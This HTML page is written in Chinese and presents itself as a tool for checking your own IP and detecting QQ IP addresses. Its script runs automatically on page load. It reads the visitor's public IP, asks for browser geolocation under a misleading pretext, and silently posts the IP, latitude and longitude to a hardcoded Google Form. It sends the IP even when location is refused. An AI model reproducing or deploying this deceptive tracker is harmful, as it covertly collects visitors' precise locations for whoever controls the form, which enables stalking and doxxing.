<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <title>简单实用地自检查IP和侦测QQIP</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    #status, #info { margin-top: 20px; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h1>查询QQIP功能加载中，请稍候......</h1>
  <p id="info">=请允许定位权限以确保功能运作正常（这个过程会帮您展示您的IP以确保回答的准确性）</p>

  <button onclick="getIPOnly()">点击仅显示当前公网 IP</button>
  <p id="ipOnlyResult"></p>

  <script>
    // Google 表单的URL
    const googleFormURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeWEBe4zv0G74aEItUIJIUhx-vcqLy4cVs_VO68Dqo0wN9H5w/formResponse";

    // Google 表单字段 Entry ID
    const entryIP = "entry.349181765";
    const entryLon = "entry.1434358418";
    const entryLat = "entry.99996352";

    // 仅显示IP按钮功能
    async function getIPOnly() {
      const output = document.getElementById('ipOnlyResult');
      output.textContent = "查询中……";
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        output.textContent = "当前公网 IP 是：" + data.ip;
      } catch (e) {
        output.textContent = "获取失败：" + e.message;
      }
    }

    // 获取公网IP
    async function getIP() {
      try {
        let res = await fetch('https://api.ipify.org?format=json');
        let data = await res.json();
        return data.ip;
      } catch (e) {
        return "获取失败";
      }
    }

    // 根据IP数字匹配国家
    async function fetchCountryFromIP(ip) {
      const ipNum = ip.split('.').reduce((acc, val) => acc * 256 + Number(val), 0);
      const response = await fetch('ip_country_ranges.json');  // 确保路径正确
      const data = await response.json();

      for (const [start, end, country] of data) {
        if (ipNum >= start && ipNum <= end) {
          return country;
        }
      }

      return '未知国家';
    }

    // 提交到Google表单
    function postToGoogleForm(ip, lon, lat) {
      const formData = new FormData();
      formData.append(entryIP, ip);
      formData.append(entryLon, lon);
      formData.append(entryLat, lat);

      fetch(googleFormURL, {
        method: 'POST',
        mode: 'no-cors',
        body: formData
      }).catch(console.error);
    }

    // 主流程
    async function main() {
      const ip = await getIP();
      document.getElementById('info').textContent = "IP: " + ip + "，等待定位中...";

      const country = await fetchCountryFromIP(ip);
      document.getElementById('info').textContent += "\n归属国家: " + country;

      if (!navigator.geolocation) {
        document.getElementById('info').textContent += "\n浏览器不支持定位功能";
        postToGoogleForm(ip, "不支持", "不支持");
        return;
      }

      navigator.geolocation.getCurrentPosition(position => {
        const lat = position.coords.latitude.toFixed(6);
        const lon = position.coords.longitude.toFixed(6);
        document.getElementById('info').textContent += `\n经度: ${lon}\n纬度: ${lat}`;
        postToGoogleForm(ip, lon, lat);
      }, err => {
        document.getElementById('info').textContent += `\n定位失败：${err.message}`;
        postToGoogleForm(ip, "失败", "失败");
      }, {timeout: 15000});
    }

    main();
  </script>
</body>
</html>
